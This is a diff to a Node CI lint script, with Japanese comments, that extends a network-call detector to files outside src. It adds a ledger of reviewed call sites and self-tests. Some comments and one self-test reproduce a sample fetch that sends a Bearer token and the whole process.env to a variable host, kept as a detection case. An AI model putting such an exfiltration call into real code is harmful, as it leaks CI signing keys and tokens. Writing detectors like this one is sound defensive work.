@@ -30,6 +30,7 @@
  */
 'use strict';
 
+const { execFileSync } = require('node:child_process');
 const fs = require('node:fs');
 const path = require('node:path');
 
@@ -45,6 +46,16 @@ const REPO_ROOT = path.resolve(__dirname, '..');
 // `config.tokenUrl` という丸ごと変数の宛先へ飛んでいながら、
 // `src/main/clients` の外なので台帳に一度も載っていなかった。
 const ROOTS = ['src'];
+//
+// **2026-09-20 (パス 342): 「src だけ」で正しいことを実測し、理由を書いた。**
+// それまで ROOTS の注記は「どのサブディレクトリを並べるか」の歴史だけで、
+// **リポジトリのどの根を見るか**は一度も問われていなかった —— 法則
+// `scan-whole-tree` が言う「対象を絞ったのか忘れたのか、コードの上で
+// 見分けがつかない」形で、しかもこの門はその法則の執行者である。
+// 実測は下の `REVIEWED_OUTSIDE_SENDS` の注記にある。結論だけ書くと:
+// 木全体へ広げると 20 件出るが**真陽性は 0 件**で、src の外に実在する
+// 網の口 3 件は**どれも ROOTS を広げても見えない**。だから広げるのではなく、
+// **別の検出器と全件台帳**を第 3 の母集団として足した。
 
 // 2026-08-22 の点検で足した: **`fetch` そのものが入っていなかった。**
 // 一覧はこの repo のラッパ (jsonFetch / apiFetch / transport …) だけを見て
@@ -259,6 +270,113 @@ const REVIEWED_VARIABLE_DESTINATIONS = [
 ];
 
 /**
+ * **走査の外に在る網の口の台帳** (2026-09-20 · パス 342)。
+ *
+ * 上の 2 つの検出器は `ROOTS`（= `src`）の `.ts` / `.tsx` しか読まない。
+ * **その範囲が正しいことは実測で確かめた**が、確かめるまで理由はどこにも
+ * 書かれておらず、「対象を絞った」のか「対象を忘れた」のか見分けがつかなかった。
+ *
+ * ## 対照 (2026-09-20 実測) —— 穴は生きていた
+ *
+ * `scripts/_control342.cjs` に、可変ホストへ資格情報と環境変数を送る形
+ *
+ *     fetch(`https://${host}/v1/collect`, {
+ *       method: 'POST',
+ *       headers: { Authorization: `Bearer ${token}` },
+ *       body: JSON.stringify({ env: process.env }),
+ *     })
+ *
+ * を植えると、**この門を含む 37 ゲートすべてが exit 0** だった。
+ * 同じコードを `src/` へ置くとこの門が鳴る。**差は検出器ではなく走査範囲だけ。**
+ * `scripts/` は CI で走り、`release.yml` の梱包ステップは `CSC_LINK` /
+ * `CSC_KEY_PASSWORD` / `APPLE_APP_SPECIFIC_PASSWORD` / `GH_TOKEN` を env に
+ * 持つので、`process.env` を送る script は実害の形そのものである。
+ *
+ * ## なぜ `ROOTS` を広げないのか (実測)
+ *
+ *   - 走査を木全体 + `.cjs` / `.mjs` / `.js` へ広げると **20 件**出るが、
+ *     **真陽性は 0 件**。内訳は各ゲートの self-test の文字列標本と、
+ *     scaffold が書き出す雛形である（雛形が生む `src/main/clients/<id>.ts`
+ *     のほうは本物の走査が捕まえる）。台帳が 20 行の偽陽性で埋まると、
+ *     上の注記が繰り返し言っている「本当に危ない数件が埋もれる」になる。
+ *   - `src/` の外に実在する網の口は **3 つだけ**で、**3 つとも送り先が
+ *     素の識別子** (`fetch(req)` / `fetchImpl(current, …)` / `fetch(url, …)`)。
+ *     `BARE_SEND` はプロパティ参照だけを見ると**意図して**決めているので、
+ *     **`ROOTS` を広げてもこの 3 つは 1 件も見えない。**
+ *
+ * ## だから問いを変える
+ *
+ * 「送り先が変数か」を問うのをやめ、**母集団が 3 件しかないことを使って
+ * 全件を台帳に載せる**。`src` の外で網へ出る呼び出しが 4 つ目になったら、
+ * その守りを書くまで落ちる。
+ *
+ * ## この台帳の限界（書かずに置くと「見張っているつもり」になる）
+ *
+ *   - 見るのは `OUTSIDE_SEND_NAMES` の綴りだけ。`child_process` から
+ *     `curl` / `wget` を起こす形は見ない（`.sh` は `lint:shell` の規則 ④ が
+ *     台帳で持つ。`.cjs` からの起動は今 0 件）。
+ *   - 文字列リテラルの中は数えない。`src` の外の `.cjs` は**ゲート自身**が
+ *     大半で、その self-test の標本がそのまま網の口に見えるため
+ *     （実測: 落とさないと 14 件、落とすと 3 件）。逆に、テンプレートリテラル
+ *     （コード生成の雛形）の中は落とさないので、雛形が `fetch(` を書き出す
+ *     日には偽陽性として 1 行増える —— 鳴る側に倒してある。
+ */
+const OUTSIDE_SEND_NAMES = [
+  ...NETWORK_CALL_NAMES,
+  // 差し替え可能な既定引数 (`deps.fetchImpl ?? fetch`)。`src` には無い綴り。
+  'fetchImpl',
+  // Node 自身の HTTP API。renderer / main は fetch しか使わないので上の一覧に無い。
+  'https.request',
+  'http.request',
+  'https.get',
+  'http.get',
+];
+
+// 直前の `.` は**除かない** —— `deps.fetchImpl(…)` や `client.fetch(…)` の形も
+// 網の口である。`BARE_SEND` はプロパティ参照を「送り先」の側で見るが、ここで
+// 見たいのは**呼び出しの名前**なので条件が逆になる。実測 (2026-09-20): `.` を
+// 外しても件数は 3 件のまま —— 閉じる側に倒しても今日の偽陽性は増えない。
+const OUTSIDE_SEND = new RegExp(
+  `(?<![\\w$])(?:${OUTSIDE_SEND_NAMES.map((n) => n.replace(/\./g, '\\.')).join('|')})\\s*\\(`,
+);
+
+/**
+ * `src` の外の網の口の台帳。**全件**載る（変数の送り先だけではない）。
+ * `needle` は原文の一部で、行番号ではなく本文で照合する。
+ */
+const REVIEWED_OUTSIDE_SENDS = [
+  {
+    file: 'assets/sw.js',
+    needle: 'fetch(req)',
+    guard:
+      'Service Worker の fetch ハンドラ。送り先を**作らない** —— ページ自身が出した'
+      + ' `event.request` をそのまま転送する。同一オリジンの GET 以外は `respondWith`'
+      + ' せずに素通しし、Cache Storage へ書くのは `res.ok` のときだけ'
+      + ' (2026-07 の監査で、第三者 API の応答が平文で端末に残るのを閉じた)。',
+  },
+  {
+    file: 'scripts/knowledge-autopilot.cjs',
+    needle: 'fetchImpl(current',
+    guard:
+      '出典 URL の到達確認 (週次 CI)。`fetchWithCheckedRedirects` が `redirect: manual`'
+      + ' で 1 ホップずつ進み、**毎ホップ** `public-host-guard.cjs` の `isFetchableUrl`'
+      + ' (http/https のみ) と `resolvesToPublicHost` (DNS を引いて私有・予約帯を拒否)'
+      + ' を通す。MAX_LINK_REDIRECTS 5 で打ち切り。資格情報は 1 つも載せない'
+      + ' (このファイルに `Authorization` は 0 件)。',
+  },
+  {
+    file: 'scripts/ollama-cli.cjs',
+    needle: 'fetch(url,',
+    guard:
+      'ループバック固定。`url` は `shared.buildOllamaUrl(base, path)` の返り値だけで、'
+      + ' `base` は `buildLoopbackBase` が `http://127.0.0.1:<10 進ポート>` に組み直し'
+      + ' (`0x2b` / `1e3` を弾くため `/^\\d+$/` を要求)、`path` は `OLLAMA_READ_PATHS`'
+      + ' の 3 つ (`/api/version` `/api/tags` `/api/chat`) だけ。判定は UI 版と同じ'
+      + ' `src/shared/ollama.ts` を esbuild で読み込んで共有する。',
+  },
+];
+
+/**
  * **ホスト部**が定数か。
  *
  * 見るのはホストだけで、パスやクエリの補間は対象外。ここが見張りたいのは
@@ -380,7 +498,9 @@ function selfTest() {
   const extCases = [
     ['.ts を読む', 'clients/github.ts', true],
     ['.tsx を読む (2026-08-25 に外れていた)', 'pages/LibraryPage.tsx', true],
-    ['.js は読まない (src はすべて TypeScript)', 'legacy.js', false],
+    // 「src はすべて TypeScript」は `ROOTS` が src だから真である —— 循環した理由なので、
+    // src の外の `.js` / `.cjs` は `REVIEWED_OUTSIDE_SENDS` が**全件**で持つ (パス 342)。
+    ['.js は読まない (src はすべて TypeScript。src の外は第 3 の母集団が持つ)', 'legacy.js', false],
     ['.json は読まない', 'registry.json', false],
     ['.tsx を含む名前でも拡張子でなければ読まない', 'notes.tsx.md', false],
   ];
@@ -410,6 +530,51 @@ function selfTest() {
     const ok = got === expected;
     if (!ok) bad++;
     console.log(`  ${ok ? '✓' : '✗'} URL らしさ: ${label}: ${got} 件 (期待 ${expected})`);
+  }
+
+  /*
+   * **第 3 の母集団の検出器** (2026-09-20 · パス 342)。
+   *
+   * 標本は実測した対照そのもの。`scripts/_control342.cjs` にこの形を置くと
+   * **37 ゲートすべてが exit 0** だった (同じコードを src へ置くとこの門が鳴る)。
+   */
+  const outsideCases = [
+    [
+      '★ 対照そのもの: 可変ホスト + Authorization + process.env を CI の script から',
+      ['  return fetch(`https://${host}/v1/collect`, {', '    headers: { Authorization: `Bearer ${t}` },'],
+      1,
+    ],
+    // 上の 2 つの検出器が**原理的に見ない**形。`BARE_SEND` はプロパティ参照
+    // だけを見ると決めており、src の外の実物 3 件はどれも素の識別子である。
+    ['★ 送り先が素の識別子でも数える (BARE_SEND が意図して見ない形)', ['const r = await fetch(url, init);'], 1],
+    ['★ 差し替え可能な既定引数も数える', ['const res = await fetchImpl(current, init);'], 1],
+    ['★ プロパティ経由の呼び出しも数える', ['await deps.fetchImpl(current, init);'], 1],
+    ['★ Node の HTTP API も数える', ['https.request(opts, cb);'], 1],
+    // 落とす側 —— ここを落とさないと台帳が 14 行になり、本当に見たい 3 件が埋もれる。
+    ['ゲート自身の self-test の文字列標本は数えない', ["  ['素の fetch を通信とみなす', 'await fetch(`https://${h}/x`);', true],"], 0],
+    ['行コメントは数えない', ['// await fetch(url, init);'], 0],
+    ['ブロックコメントの中は数えない', ['/*', ' * await fetch(url, init);', ' */'], 0],
+    ['通信でない呼び出しは数えない', ['await render(url, init);'], 0],
+    ['名前の一部に含まれるだけでは数えない', ['await prefetchAll(url);'], 0],
+  ];
+  for (const [label, lines, expected] of outsideCases) {
+    const got = outsideSendFindings('scripts/x.cjs', lines).length;
+    const ok = got === expected;
+    if (!ok) bad++;
+    console.log(`  ${ok ? '✓' : '✗'} src の外: ${label}: ${got} 件 (期待 ${expected})`);
+  }
+  {
+    // 母集団の床。走査が死んで「0 件だから健全」にならないこと。
+    let threw = false;
+    try {
+      const n = outsidePopulation().length;
+      if (n < OUTSIDE_POPULATION_FLOOR) threw = true;
+    } catch {
+      threw = true;
+    }
+    const ok = !threw;
+    if (!ok) bad++;
+    console.log(`  ${ok ? '✓' : '✗'} src の外の母集団が床 ${OUTSIDE_POPULATION_FLOOR} 以上`);
   }
 
   if (bad > 0) {
@@ -515,6 +680,83 @@ function collectBareSends() {
 }
 
 /**
+ * `src` の外の 1 ファイル分。**純粋関数として外へ出す** (証人が合成を流せるように)。
+ *
+ * コメント (行 / ブロック) と `'…'` / `"…"` の中は数えない —— 理由は
+ * `REVIEWED_OUTSIDE_SENDS` の「限界」を参照。
+ */
+function outsideSendFindings(rel, lines) {
+  const found = [];
+  let inBlock = false;
+  for (let i = 0; i < lines.length; i++) {
+    const trimmed = lines[i].trim();
+    if (inBlock) {
+      if (trimmed.includes('*/')) inBlock = false;
+      continue;
+    }
+    if (trimmed.startsWith('/*')) {
+      if (!trimmed.includes('*/')) inBlock = true;
+      continue;
+    }
+    if (trimmed.startsWith('//') || trimmed.startsWith('*')) continue;
+    const code = lines[i].replace(/'(?:[^'\\]|\\.)*'/g, "''").replace(/"(?:[^"\\]|\\.)*"/g, '""');
+    if (!OUTSIDE_SEND.test(code)) continue;
+    found.push({ file: rel, line: i + 1, call: trimmed.slice(0, 140) });
+  }
+  return found;
+}
+
+/**
+ * `src` の外の母集団。**git に聞く** —— `dist/` `dist-electron/` の生成物を
+ * 拾わないためで、無視の規則を書き写すと必ずずれる。
+ *
+ * `--others --exclude-standard` を足すのは、**未追跡のファイルも数える**ため。
+ * 2026-09-20 (パス 341) に、これを落とした母集団が「手元では緑・CI では赤」を
+ * 作った実績がある (新しいファイルは commit されるまで手元から見えない)。
+ *
+ * git が使えない環境では例外にする。**黙って 0 件にはしない** ——
+ * 走査が死んで「1 件も無いから健全」になるのが、この repo が繰り返し
+ * 直してきた形である (法則 `count-has-floor`)。
+ */
+const OUTSIDE_POPULATION_FLOOR = 60;
+
+function outsidePopulation() {
+  const out = execFileSync(
+    'git',
+    ['ls-files', '--cached', '--others', '--exclude-standard'],
+    { cwd: REPO_ROOT, encoding: 'utf8', maxBuffer: 64 * 1024 * 1024 },
+  );
+  const files = [...new Set(out.split('\n').filter(Boolean))]
+    .filter((f) => /\.(tsx?|(?:c|m)?js)$/.test(f))
+    .filter((f) => !f.startsWith('src/'))
+    .filter((f) => !f.includes('__tests__/'))
+    .filter((f) => !f.startsWith('node_modules/'))
+    .sort();
+  if (files.length < OUTSIDE_POPULATION_FLOOR) {
+    throw new Error(
+      `src の外の母集団が ${files.length} 件しかありません (床 ${OUTSIDE_POPULATION_FLOOR})。`
+        + ' 走査が死んでいます — 0 件を「健全」と読まないための床です。',
+    );
+  }
+  return files;
+}
+
+function collectOutsideSends() {
+  const found = [];
+  for (const rel of outsidePopulation()) {
+    const abs = path.join(REPO_ROOT, rel);
+    let text;
+    try {
+      text = fs.readFileSync(abs, 'utf8');
+    } catch {
+      continue; // 消された直後の未追跡ファイルなど
+    }
+    found.push(...outsideSendFindings(rel, text.split('\n')));
+  }
+  return found;
+}
+
+/**
  * 走査する拡張子。**2026-08-25 まで `.ts` だけで、`.tsx` (94 ファイル) が
  * 丸ごと視界の外だった。** 上の注記は「一覧をやめて src 全体にした」と
  * 書いているが、それはディレクトリの話で、範囲はもう一段**拡張子**でも
@@ -594,9 +836,40 @@ function main() {
     }
   }
 
+  /*
+   * **第 3 の母集団: `src` の外の網の口** (2026-09-20 · パス 342)。
+   * 上の 2 つと違って「変数の送り先だけ」ではなく**全件**を台帳に要求する。
+   * 母集団が 3 件しかないので全件で足り、素の識別子の送り先 (上の 2 つが
+   * 原理的に見ない形) をここで捕まえられる。
+   */
+  const outside = collectOutsideSends();
+  for (const f of outside) {
+    const hit = REVIEWED_OUTSIDE_SENDS.find((r) => r.file === f.file && f.call.includes(r.needle));
+    if (!hit) {
+      problems.push(
+        `${f.file}:${f.line} — src の外の網の口が台帳にありません\n` +
+          `    ${f.call}\n` +
+          `    送り先が何に縛られているかを scripts/lint-network-targets.cjs の\n` +
+          `    REVIEWED_OUTSIDE_SENDS に書いてください。書けないなら縛れていません。\n` +
+          `    ここは CI で走る経路です (release.yml の梱包ステップは署名鍵を env に持ちます)。`,
+      );
+    }
+  }
+  for (const r of REVIEWED_OUTSIDE_SENDS) {
+    const still = outside.some((f) => f.file === r.file && f.call.includes(r.needle));
+    if (!still) {
+      problems.push(
+        `${r.file} — 台帳の項目 (src の外の網の口) が実在しません (直したか移動した)\n` +
+          `    ${r.needle}\n` +
+          `    REVIEWED_OUTSIDE_SENDS から消してください。`,
+      );
+    }
+  }
+
   console.log(
     `Scanned ${ROOTS.length} directories: ${found.length} network target(s) whose destination comes from a variable, ` +
-      `${bare.length} send(s) whose destination is a variable outright`,
+      `${bare.length} send(s) whose destination is a variable outright, ` +
+      `${outside.length} send(s) outside ${ROOTS.join('/')} (all of them ledgered, not just the variable ones)`,
   );
   if (problems.length === 0) {
     /*
@@ -629,10 +902,15 @@ function main() {
 module.exports = {
   templateFindings,
   bareSendFindings,
+  outsideSendFindings,
+  outsidePopulation,
   hasConstantHost,
   REVIEWED,
   REVIEWED_VARIABLE_DESTINATIONS,
+  REVIEWED_OUTSIDE_SENDS,
   NETWORK_CALL_NAMES,
+  OUTSIDE_SEND_NAMES,
+  OUTSIDE_POPULATION_FLOOR,
 };
 
 if (require.main === module) process.exit(main());
